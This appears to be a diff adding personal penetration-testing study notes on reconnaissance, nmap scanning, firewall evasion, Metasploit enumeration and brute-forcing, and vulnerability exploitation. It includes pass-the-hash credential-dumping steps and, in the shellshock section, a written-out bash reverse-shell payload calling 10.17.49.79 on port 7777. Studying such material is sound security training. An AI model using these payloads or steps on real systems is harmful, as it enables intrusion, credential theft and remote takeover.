@@ -1,0 +1,235 @@
+
+
+##INFORMATION GATHERING ACTIVE AND PASSIVE
+
+1 how to find the ip address of website? - "host" or "nslookup"
+
+2 always look for robots.txt file or phpinfo.php
+
+3 also always look for sitemap.xml (it can show us the web pages or hidden web pages)
+
+4 we can also use tools like ==wappalizer, builtwith and whatweb==(kali) to see whats in the website or 
+how its made 
+
+5 httrack - it downloads the entire codes of a website
+
+6 whois - we can use it to find info about the website like the owner number and dns
+
+7 netcraft - it tells us all about the website like who own it where its hosted 
+
+8 dnsrecon(in kali) and dns dumpster -- it can find domain and discover hosts
+
+9 wafw00f its a tool which can detect which firewall the website is using
+
+10 sublist3r for finding subdoamins of a website (usage= sublist3r -d example.com -e google)
+
+11 google dorking -
+site: (to find webpages from only a particular website)
+inurl: (it find specific words strings such as admin etc)
+site:* .example.com   (it can help us find subdomains )
+intitle: (it can also help us find specific words just like inurl)
+filetype: (to find files like pdf etc)
+intitle:index of (common vuln)
+cache:example.com (it can show how the old version of a website looked like)
+inurl:passwd.txt / inurl:auth_user_file.txt
+use ghdb a lot for this
+
+12 wayback machine (to see how the website looked before)
+
+13 theHarvester(kali) (it can be used to find the gmails or ip etc)
+
+14 haveibeenpwned (to see if the email is a part of the breach)
+
+
+
+
+15 dnsenum (used to find dns zonetrnasfer and dns brute force to find sub domains)
+
+16 dig (which is just like the dnsenum but its better - (usage - dig axfr @nsztm1.digi.ninja zonetransfer.me))
+
+17 fierce (just like the other 2 tools above (usage - fierce dns example.com -wordlist example.txt))
+
+18 nmap (for udp use - sU)
+
+
+(all these tools are used in terminal)
+host
+nslookup
+whatweb
+httrack
+whois
+dnsrecon
+wafw00f
+sublist3r
+theHarvester
+dnsenum
+dig
+fierce
+
+---
+tools used
+httrack
+dirsearch
+whatweb
+
+
+
+---
+##FOOTPRINTING AND SCANNING
+
+the ping command does not always work with windows 
+fping (better than ping usage: fping -a -g ip 2> /dev/null )(g used when we want to scan the whole internet domain no need for it if we using only one ip)
+even after all this we cant find the host alive or not we can use nmap -Pn command
+
+
+nmap usage 
+-F (it does fast scan only top 100)
+-sV (version detection of ports which are open) | --version-intensity(0-9) (to force the accurate result)
+-A (all)
+-sS (it does not do 3 way handshake)
+-sT (it does the 3 way handshake)
+-sU (for udp)
+-O (for os detection) | --osscan-guess (for force detection
+
+-PS (to find if a host is online or if its blocked by firewall)
+-PA    " ''
+-PE   ''  ''
+(best scan for host discovery) nmap -sn -PS(ports) -T4 <ip> 
+
+-sC (default scripts common vulns)
+--script=(any script we wanna run)(we can find all the scripts in nmap/scripts)(to see what the script does we can do nmap --script-help=ftp-anon.nse)
+
+we will be doing mostly this (nmap -Pn -p- -sS -sV -T4 -sC  192.222.222.3)
+
+
+
+firewall evasion:-
+nmap -sA (it can show if the port is behind firewall or not)
+nmap -f (for fragmentation)
+nmap -D 10.x.x.1 (decoy it acts like the packets are sent by other system)
+(best scan for this is) nmap -p- -Pn -sS -n -sV -T1 -f --data-length 200 -D 10.x.x.1,10.x.x.2,etc <ip>
+
+-------------------------------------------------------------------------------------------------------------
+##ENUMERATION 
+
+
+(nmap to msf)
+	nmap -oX result.xml (we can use this and put that in the msf)
+	(then start the database by doing :- service postgresql start and then start msf)
+	(first chceck if db is active by doing db_status then create a workspace in msf by workspace -a example and then import the nmap result by db_import /path/result.xml and then we can see it by typing host we can then look at services if we want to perfrom more things from nmap in msf we can do it by creating another workspace and doing db_nmap <options> )
+
+msf auxiliary scanning
+	(we got into a target 1 and we see another target in it target 2 now we cant use nmap to scan that target 2 bc its on the internal network we can then use msf auxiliary to do all this we can search for portscan use one of it, if it find port 80 we can do curl to find vulns and then search those vulns on msf again to exploit once we get a shell we can do ip a to check if there are other targets and then we will exit that shell and on meterpreter we will run run autoroute -s <ip of t1> and then we can put that meterpreter at the bg and then repeat the procces to scan the target but remember to change the ip for target 2 )
+
+ftp enum on msf
+	(we can do portscan on msf and if we find 21 open we can do version detection and then find if anonymous log is enable if not we can use authentication module to do brute force we can find the wordlist undet /usr/share/wordlist/meteasploit-framework/data/wordlist/common-usr.txt and for passwd all are same just file name is unix_passwords.txt)
+
+smb enum on msf
+	(we can do portscan again and if we find 139 o 445 we can find the version of smb and then we can find the user by using smb enum user module and once we find the user we can search for shares and after that we can do is do brute force one of the users by using smb login module )
+
+http enum of msf
+	(when we see port 80 open we can find version using the msf and we can also do more enum using http_header module we can also find robots.txt there by using it module in msf and then we can do curl to see whats there in that we can also do directory busting using dir_scanner module and then we can do is file brute forcing just like directory busting the module for this is files_dir and to do login we can do brute force for both user and pass and its module is http_login for name file we can use namelist.txt and for pass we can use the unix , if we want to find or enumerate more to find a username we can use a module to find usernames and that is apache_userdir_enum and we can upload anything on it using the module http_put )
+
+mysql enum on msf
+	(we can see mysql running on 3306 and we can find version of it using msyql_version module and then we can do is brute force attack using mysql_login module in mysql we always know the username its root or admin and after getting the pass we can do more enum using mysql_enum which require password and after that we can use another module to enum or type cmd and execute sql quriees and that is mysql_sql and in that we can run sql such show databases; and then we can use another module to do more enum its called mysql_schema)
+
+ssh enum on msf
+	(when we find port 22 open we can do is find the version of it using ssh_version module and then we can do is brute force to get in we can do that by using ssh_login module and for users we can use the common_users.txt file and for password we can use the unix_password.txt file we can also find users using that wordlist and using a diff module that is ssh_enumusrs)
+	
+	smtp enum on msf
+	(when port 25 is open we can do is use smpt_version module to find its version and then we can use is smtp_enum which will find users )
+
+-------------------------------------------------------------------------------------------------------------
+##VULNERABLITY ASSESSMENT
+
+
+when we find open ports and see whats running on them suppose we see port 8080 running a webserver there we can do use msf to search for that webserver by typing in domain name and then to see if its really vulnerable to it we can do is use the info option in msf 
+
+searchsploit(kali) - tool used to search for exploit from exploit db we can use this tool to search for specific msf exploit using grep 
+
+we can download an extension called mestasploit-autopwn from github use the git command and then just install it mv it to the mestaslpoit-framwork/plugins and on msf we can just load it up (it can find all the exploit modules based on the ports open we can use -t , -p and -PI options)(eternalblue)
+
+
+webdav:- it is a feature or extension that allows users to manage like edit delete file on the webserver for this we can use tools like cadaver and davtest
+usage:- cadaver http://target.com
+    davtest -url http://target.com(it shows us what files we can upload or what can be executed)
+we can also bruteforce to find the cred for webdav with help of hydra 
+usage:- hydra -L /path/ -P /path/ ip http-get /whereyouwanttodothatattack/
+
+we can find various webshells in kali located at /webshells
+
+to exploit eternblue manually we can use the tool autoblue from github
+
+
+pass the hash(we can steal hash of pass and login in with it)
+	(when we get a shell or meterpreter we can do is pgrep lsass and then migrate to that process id then load kiwi then lsa_dump_sam this will get us the creds for the user ntlm hashes we can then do is hashdump and get the entire hash and then we can go to msf and then we can do psexec exploit )
+
+shellshock(its a bug that let us run our own command)
+	(we can find this vuln on webserver when we see something runnig using cgi commands to see if that is vulnerable we can use nmap script http-shellshock with --script-args "http-shellshock.uri=/gettime.cgi when its vulnerable we can go there and use burp and on that we can go to repeater and remove the user agent data and put " () { : ; }; echo; echo; /bin/bash -c 'bash -i>&/dev/tcp/10.17.49.79/7777 0>&1'   and if we want to do that with msf we can search for shellshock and use the apache_mod_cgi_bash exploit and set the targeturi to the path and exploit )
+
+nessus (we can find vulns and we can import it to msf and we can find all the exploits)
+
+wmap (its in msf used to scan vulns on a webserver like nikto it can provide us with all the auxiliary)
+(usage:- on msf load wmap then we can do is wmap_[tab option to see all the things] we can set target there on sites just the ip and on target we can target the web we can put http ip/anydir and then wmap_run -t and then wmap_run -e it will run all the auxiliary it has find) 
+
+common ports 
+
+
+20 – FTP Data  
+21 – FTP  
+22 – SSH  
+23 – Telnet  
+25 – SMTP  
+53 – DNS  
+67 – DHCP Server  
+68 – DHCP Client  
+69 – TFTP  
+80 – HTTP  
+110 – POP3  
+111 – RPCbind/Portmapper  
+135 – MS RPC  
+137 – NetBIOS Name Service  
+138 – NetBIOS Datagram Service  
+139 – NetBIOS Session Service  
+143 – IMAP  
+161 – SNMP  
+162 – SNMP Trap  
+389 – LDAP  
+443 – HTTPS  
+445 – SMB  
+465 – SMTPS  
+500 – ISAKMP / VPN  
+514 – Syslog  
+587 – SMTP Submission  
+636 – LDAPS  
+873 – rsync  
+993 – IMAPS  
+995 – POP3S  
+1080 – SOCKS Proxy  
+1433 – MSSQL  
+1434 – MSSQL Monitor  
+1521 – Oracle DB  
+2049 – NFS  
+2082 – cPanel  
+2083 – cPanel (SSL)  
+2181 – Zookeeper  
+2375 – Docker  
+3306 – MySQL  
+3389 – RDP  
+3690 – Subversion (SVN)  
+4333 – mSQL  
+5000 – UPnP / Web services  
+5432 – PostgreSQL  
+5900 – VNC  
+5985 – WinRM (HTTP)  
+5986 – WinRM (HTTPS)  
+6379 – Redis  
+6667 – IRC  
+8000 – Web services / Proxy  
+8080 – HTTP Proxy / Alt HTTP  
+8443 – HTTPS Alt  
+8888 – Web services / Proxy  
+9200 – Elasticsearch (HTTP)  
+9300 – Elasticsearch (Transport)  
+11211 – Memcached  
+27017 – MongoDB
